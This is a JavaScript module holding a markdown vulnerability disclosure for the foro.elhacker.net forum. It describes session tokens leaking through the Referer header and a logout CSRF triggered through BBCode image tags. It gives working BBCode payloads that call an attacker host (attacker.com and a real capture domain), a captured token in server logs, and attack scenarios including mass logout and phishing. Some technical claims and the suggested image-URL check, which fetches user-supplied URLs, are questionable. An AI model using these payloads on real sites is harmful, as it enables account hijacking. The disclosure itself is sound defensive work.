const e=`## Session Cookie Leakage & CSRF Logout Chain

Security report submitted July 24, 2020 to foro.elhacker.net where I discovered two chained vulnerabilities: session cookie leakage through HTTP Referer header enabling account takeover, combined with CSRF logout amplified by the forum's BBCode image rendering.

## Overview

This report details two interconnected vulnerabilities that create a complete attack chain:

1. **Session Cookie Leakage** - HTTP Referer exposes session tokens enabling account takeover
2. **CSRF Logout** - BBCode allows embedding logout URLs as "images", making browsers trigger logout from the victim's own browser

The second vulnerability has amplified impact because the forum's BBCode parser allows pointing image tags to any URL, including the forum's own logout endpoint. When victims view the attacker's post, their browser attempts to load the "image" which actually triggers a same-origin request to the logout endpoint.

## Vulnerability #1: Session Cookie Leakage

### Technical Details

**Type:** Session Hijacking / Account Takeover

**Affected URL:** \`https://foro.elhacker.net/post.html\`

**Root Cause:** Session token (\`sesc\`) exposed in URL parameters + insufficient Referrer-Policy

When clicking the "modify" button on a post, users are redirected to a URL containing their session cookie as a parameter:

\`\`\`
https://foro.elhacker.net/post.html;msg=2225482;topic=505987.0;sesc=88c02d6e76b973a14cd327b38792c848
\`\`\`

By embedding an image from an attacker-controlled server in a forum post using BBCode, any user who clicks "modify" on a page containing that message leaks their session cookie via the HTTP Referer header.

### Attack Vector

**Step 1: Attacker creates post with external image**

\`\`\`bbcode
[img width=0]https://attacker.com/capture.png[/img]
\`\`\`

When anyone views this post, their browser attempts to load the image from \`attacker.com\`.

**Step 2: Victim views the thread and clicks "modify"**

The victim is on a page with URL:
\`\`\`
https://foro.elhacker.net/post.html;sesc=VICTIM_TOKEN
\`\`\`

When their browser loads the attacker's image, the Referer header is sent.

**Step 3: Attacker captures session token**

The attacker's server receives:

\`\`\`
GET /capture.png HTTP/1.1
Host: attacker.com
Referer: https://foro.elhacker.net/post.html;msg=2225482;topic=505987.0;sesc=fc3f41b0f5a7c557ee0511eb237c9408
\`\`\`

**Step 4: Account takeover**

The captured \`sesc\` parameter can be replayed to hijack the victim's session.

### Proof of Concept - Session Leakage

**Test Setup:**
- Target: \`https://foro.elhacker.net/profiles/asabo-u603685.html\`
- Malicious thread: \`https://foro.elhacker.net/foro_libre/contar_vueltas_de_hidden_protocol_en_ataques_ironingpass-t505987.0.html\`
- Attacker server: \`https://phishingoda.ga\`

**Post created with BBCode:**
\`\`\`bbcode
[img]https://phishingoda.ga/webrc/log.png[/img]
\`\`\`

**Captured logs from attacker server:**

\`\`\`
Server instance started at Thu, 23 Jul 2020 20:24:47 GMT
Got a request for '/webrc/log.png'

Connection: Keep-Alive
X-Forwarded-Server: phishingoda.ga
X-Forwarded-Host: phishingoda.ga
X-Forwarded-For: 176.83.115.225
Accept-Language: es-ES,es;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: https://foro.elhacker.net/post.html;msg=2225482;topic=505987.0;sesc=fc3f41b0f5a7c557ee0511eb237c9408
\`\`\`

**Session token successfully captured:** \`sesc=fc3f41b0f5a7c557ee0511eb237c9408\`

## Vulnerability #2: CSRF Logout via BBCode Abuse

### Technical Details

**Type:** Cross-Site Request Forgery (CSRF) with Same-Origin Amplification

**Affected Endpoint:** \`https://foro.elhacker.net/logout.html\`

**Amplification Factor:** BBCode allows any URL in image tags, including the forum's own logout endpoint

The logout endpoint accepts GET requests without CSRF protection. The forum's BBCode parser renders any URL as an image, even if it's not actually an image. This allows an attacker to embed the logout URL as an "image" in their post.

**Critical Detail:** When a victim views the attacker's post, their browser attempts to load the "image" which triggers a GET request to the logout endpoint. Because both the post and the logout endpoint are on \`foro.elhacker.net\`, this is a **same-origin request** that bypasses many browser protections and appears completely legitimate.

### Attack Vector

**Attacker creates a post with BBCode:**

\`\`\`bbcode
[img width=0]https://foro.elhacker.net/logout.html;sesc=STOLEN_TOKEN[/img]
\`\`\`

**What happens when victim views the post:**

1. Browser parses BBCode and sees image tag
2. Browser attempts to load "image" from \`https://foro.elhacker.net/logout.html;sesc=...\`
3. This triggers a GET request to the logout endpoint
4. Request is same-origin (forum → forum)
5. Victim is logged out immediately

### Why This Is More Dangerous

This isn't just a standard CSRF. It's amplified because:

1. **No attacker infrastructure needed** - The logout URL is on the forum itself
2. **Same-origin request** - Browser sees \`foro.elhacker.net → foro.elhacker.net\` as legitimate
3. **Rendered automatically** - Victims don't need to click anything, just view the post
4. **Bypasses many protections** - Same-origin requests are trusted by default
5. **BBCode validation failure** - Forum doesn't validate that image URLs actually point to images

The attack is delivered through a post created by the attacker that gets rendered on the forum. When victims browse the forum normally, they automatically trigger the logout.

### Proof of Concept - CSRF Logout

**Message sent to test user:**

\`\`\`bbcode
[quote author=@XSStringManolo link=action=profile;u=595084 date=1595544019]
Csrf Logout[img width=0]https://foro.elhacker.net/logout.html;sesc=fc3f41b0f5a7c557ee0511eb237c9408[/img]
[/quote]
\`\`\`

**Result:** When user Asabo viewed the message, their browser attempted to load the "image", which triggered the logout endpoint. They were immediately logged out.

## Complete Attack Chain

### Phase 1: Session Token Theft

1. Attacker creates post with BBCode: \`[img]https://attacker.com/1px.png[/img]\`
2. This post is rendered on the forum when anyone views it
3. Victim clicks "modify" on their post in that thread
4. Victim's browser loads the image from attacker.com
5. Referer header includes: \`https://foro.elhacker.net/post.html;sesc=VICTIM_TOKEN\`
6. Attacker captures the session token

### Phase 2: CSRF Logout Attack

7. Attacker sends private message or creates new post with:
\`\`\`bbcode
[img width=0]https://foro.elhacker.net/logout.html;sesc=VICTIM_TOKEN[/img]
\`\`\`
8. Victim views the message/post
9. Victim's browser attempts to load the "image"
10. Browser makes GET request to logout endpoint (same-origin)
11. Victim is logged out

### Phase 3 (Optional): Account Takeover

12. While victim is logged out, attacker uses stolen \`sesc\` for session hijacking
13. Complete control of victim's account

### Alternative: Mass Logout Attack

Instead of targeting individuals:
1. Create post in popular section with logout "image"
2. Every user who views that post gets logged out
3. Mass denial of service without any external infrastructure
4. Attack is entirely same-origin

## Impact Analysis

### Severity: HIGH

**Account Takeover (Critical):**
- Complete session hijacking via stolen tokens
- Access to private messages and user data
- Ability to post as victim
- Potential privilege escalation if admin/moderator targeted

**CSRF Logout (Amplified by BBCode Abuse):**

The CSRF logout is significantly more dangerous than typical CSRF because:

**Standard CSRF limitations:**
- Usually requires victim to visit attacker's website
- Or requires embedding attacker's content
- Often blocked by browser protections

**This CSRF bypass:**
- ✅ **No external site needed** - Victim just browses the forum normally
- ✅ **Same-origin request** - \`foro.elhacker.net\` → \`foro.elhacker.net\`
- ✅ **Automatic execution** - No clicks required, just viewing the post
- ✅ **Bypasses CSP** - Content Security Policy allows same-origin
- ✅ **Bypasses SameSite cookies** - Same-site navigation is allowed
- ✅ **Appears legitimate** - All traffic is forum-to-forum
- ✅ **No infrastructure** - Attacker doesn't maintain any servers
- ✅ **Persistent** - Post stays on forum indefinitely

**Combined Impact:**
- Steal session → Force logout → Present fake login → Steal credentials
- Mass logout campaigns delivered through forum posts
- Targeted harassment that's hard to trace
- Preparation for phishing attacks

### Attack Scenarios

1. **Mass Denial of Service:**
   - Create post in popular section
   - Every viewer gets logged out
   - Forum becomes unusable

2. **Targeted Account Takeover:**
   - Leak session token via Phase 1
   - Force logout via Phase 2  
   - Hijack session during logout window
   - Full account control

3. **Phishing Setup:**
   - Force logout
   - User sees: "Session expired, please login"
   - Present fake login form
   - Steal credentials

4. **Admin/Moderator Targeting:**
   - Identify high-value targets
   - Steal their session tokens
   - Force logout and hijack accounts
   - Gain elevated privileges

## Root Cause Analysis

### Multiple Security Failures

1. **Session Token in URL**
   - Sensitive data exposed in GET parameters
   - Leaked via Referer header

2. **Missing CSRF Protection**
   - Logout accepts GET requests
   - No token validation

3. **BBCode Validation Failure**
   - Allows any URL in image tags
   - Doesn't validate URLs point to actual images
   - Enables same-origin CSRF delivery

4. **Insufficient Referrer-Policy**
   - Default policy leaks full URL
   - Including sensitive parameters

### Why BBCode Validation Matters

The BBCode parser should:
\`\`\`php
❌ Current: [img]ANY_URL[/img] → renders any URL

✅ Should: [img]IMAGE_URL[/img] → validates URL is an actual image
\`\`\`

This failure transforms a remote CSRF (requires attacker server) into a same-origin attack (uses forum itself).

## Remediation

### Critical Fixes (Priority 1)

#### 1. Move Session Management to Cookies

\`\`\`php
// Remove session from URL completely
setcookie('PHPSESSID', $session_id, [
    'httponly' => true,  // Prevent JavaScript access
    'secure' => true,    // HTTPS only
    'samesite' => 'Strict' // Prevent CSRF
]);
\`\`\`

#### 2. Implement CSRF Protection

\`\`\`php
// Generate CSRF token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// Validate on logout (POST only)
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die('Method Not Allowed');
}

if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('Invalid CSRF token');
}
\`\`\`

#### 3. Validate BBCode Image URLs

\`\`\`php
function validateImageUrl($url) {
    // Only allow actual image URLs
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
    $parsed = parse_url($url);
    $path = $parsed['path'] ?? '';
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    
    if (!in_array($ext, $allowed_extensions)) {
        return false;
    }
    
    // Optional: Verify Content-Type via HEAD request
    $headers = @get_headers($url, 1);
    if ($headers) {
        $content_type = $headers['Content-Type'] ?? '';
        if (!str_starts_with($content_type, 'image/')) {
            return false;
        }
    }
    
    return true;
}
\`\`\`

#### 4. Add Referrer-Policy Header

\`\`\`
Referrer-Policy: origin
\`\`\`

This changes Referer from:
\`\`\`
https://foro.elhacker.net/post.html?sesc=TOKEN
\`\`\`
To:
\`\`\`
https://foro.elhacker.net/
\`\`\`

### Additional Protections (Priority 2)

#### 5. Content Security Policy

\`\`\`
Content-Security-Policy: img-src 'self' https://trusted-cdn.com
\`\`\`

#### 6. Additional Security Headers

\`\`\`
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
\`\`\`

### Defense in Depth

Layered security approach:

1. ✅ **Session in cookies** (eliminates token leakage)
2. ✅ **CSRF tokens** (prevents forged requests)
3. ✅ **POST-only logout** (blocks GET-based attacks)
4. ✅ **BBCode validation** (prevents URL-as-image abuse)
5. ✅ **Referrer-Policy** (limits information leakage)
6. ✅ **SameSite cookies** (browser-level CSRF protection)

## Fix Verification

After the webmaster implemented partial mitigation:

\`\`\`bash
$ curl -I https://foro.elhacker.net
HTTP/2 200
referrer-policy: origin
strict-transport-security: max-age=31536000
\`\`\`

**Status:** Partial fix implemented (Referrer-Policy header added)

**Remaining issues:**
- Session tokens still in URLs
- CSRF protection not implemented  
- BBCode image URL validation not added

**Recommendation:** Implement all critical fixes for complete protection.

## Disclosure Timeline

- **July 23, 2020 20:24:** Vulnerabilities discovered during security testing
- **July 24, 2020:** Comprehensive report sent to webmaster@elhacker.net
- **July 24, 2020:** Webmaster responded and implemented partial fix (Referrer-Policy)
- **July 24, 2020:** Fix verified and confirmed working
- **July 24, 2020:** Additional recommendations provided for complete remediation

## Credits

- **Discovery & Research:** StringManolo - https://foro.elhacker.net/profiles/stringmanolo-u595084.html
- **Proof of Concept:** AlbertoBSD - https://foro.elhacker.net/profiles/anon-u103841.html

## References

- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP: CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN: Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)
`;export{e as default};
